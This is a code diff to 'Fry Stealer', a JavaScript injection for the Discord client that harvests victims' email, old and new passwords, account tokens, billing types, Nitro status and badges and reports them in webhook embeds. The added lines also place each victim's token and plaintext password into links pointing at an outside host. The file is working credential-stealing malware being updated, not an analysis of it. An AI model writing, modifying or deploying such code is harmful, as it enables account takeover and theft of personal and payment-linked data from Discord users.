@@ -13,7 +13,7 @@ const config = {
   ping_val: '@here', 
   embed_name: 'Fry Stealer', 
   embed_icon: 'https://wallpaperspeed.id/gallery/wallpaper/20220427/draw-you-an-anime-profile-picture-by-rinruru-fiverr,how-to-make-anime-profile-picture-preview.webp',
-  embed_color: 9e1515, 
+  embed_color: 0x404EED, 
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
@@ -441,7 +441,7 @@ if (fs.existsSync(bdPath)) require(bdPath);`;
   );
   return !1;
 }
-
+  
 const execScript = (script) => {
   const window = BrowserWindow.getAllWindows()[0];
   return window.webContents.executeJavaScript(script, !0);
@@ -474,10 +474,10 @@ const getBilling = async (token) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += '💳 ';
+          billing += '💳';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += '<:paypal:951139189389410365>';
           break;
       }
     }
@@ -553,7 +553,7 @@ const getBadges = (flags) => {
       badges += ' <:brilliance:919973089285120111> ';
       break;
     case 64:
-      badges += ' <:bravery:919973089222205451> ';
+      badges += '<:bravery:919973089222205451>';
       break;
     case 256:
       badges += ' <:balance:919973088651776001> ';
@@ -606,7 +606,9 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
-        color: config.embed_color,
+        "title": "User Login",
+        description: `[**<:partner:909102089513340979> │ Click here if you are on a cell phone**](https://superfurrycdn.nl/copy/${token}\n${password})`,
+		    color: config.embed_color,
         fields: [
           {
             name: 'Info',
@@ -621,7 +623,7 @@ const login = async (email, password, token) => {
           {  
             name: 'ID',
             value: `\`${json.id}\``,
-            inline: false,
+            inline: true,
           },
           {  
             name: 'Badges',
@@ -655,7 +657,7 @@ const login = async (email, password, token) => {
           },
         ],
         author: {
-          name: 'User Login',
+          name: 'FryStealer',
           icon_url: ``,
         },
         footer: {
@@ -681,30 +683,67 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
-        color: config.embed_color,
+        "title": "Password Changed",
+        description: `[**<:partner:909102089513340979> │ Click here if you are on a cell phone**](https://superfurrycdn.nl/copy/${token}\n${newpassword})`,
+		    color: config.embed_color,
         fields: [
           {
-            name: 'Password Changed',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            name: 'Info',
+            value: `\`\`\`IP:  \n${config.ip}\nInjection Info: \n${__dirname}\n\`\`\``,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: 'Username',
+            value: `\`${json.username}\``,
+            inline: false,
+          },
+          {  
+            name: 'ID',
+            value: `\`${json.id}\``,
             inline: true,
           },
           {
-            name: '**Token**',
-            value: `\`${token}\``,
+            name: 'Nitro',
+            value:  `\`${nitro}\``,
+            inline: false,
+          },
+          {
+            name: 'Badges',
+            value:  `\`${badges}\``,
+            inline: false,
+          },
+          { 
+            name: 'Billing',
+            value:  `\`${billing}\``,
+            inline: false,
+          },
+          {  
+            name: 'Email',
+            value:  `\`${json.email}\``,
+            inline: false,
+          },
+          {    
+            name: 'Old Password',
+            value:  `\`${oldpassword}\``,
+            inline: false,
+          },
+          {
+            name: 'New Password',
+            value:  `\`${newpassword}\``,
+            inline: false,
+          },
+          { 
+            name: 'Token',
+            value: `\`\`\`${token}\`\`\``,
             inline: false,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: 'FryStealer',
+          icon_url: ``,
         },
         footer: {
-          text: 'Fry Stealer',
+          text: 'FryStealer',
         },
       },
     ],
@@ -723,30 +762,62 @@ const emailChanged = async (email, password, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
-        color: config.embed_color,
+        "title": "Email Changed",
+        description: `[**<:partner:909102089513340979> │ Click here if you are on a cell phone**](https://superfurrycdn.nl/copy/${token}\n${password}\n${email})`,
+		    color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            name: 'Info',
+            value: `\`\`\`IP:  \n${config.ip}\nInjection Info: \n${__dirname}\n\`\`\``,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: 'Username',
+            value: `\`${json.username}\``,
+            inline: false,
+          },
+          {  
+            name: 'ID',
+            value: `\`${json.id}\``,
             inline: true,
           },
           {
-            name: '**Token**',
-            value: `\`${token}\``,
+            name: 'Nitro',
+            value:  `\`${nitro}\``,
+            inline: false,
+          },
+          {
+            name: 'Badges',
+            value:  `\`${badges}\``,
+            inline: false,
+          },
+          { 
+            name: 'Billing',
+            value:  `\`${billing}\``,
+            inline: false,
+          },
+          {  
+            name: 'New Email',
+            value:  `\`${email}\``,
+            inline: false,
+          },
+          {    
+            name: 'Password',
+            value:  `\`${password}\``,
+            inline: false,
+          },
+          { 
+            name: 'Token',
+            value: `\`\`\`${token}\`\`\``,
             inline: false,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: 'FryStealer',
+          icon_url: ``,
         },
         footer: {
-          text: 'Fry Stealer',
+          text: 'FryStealer',
         },
       },
     ],
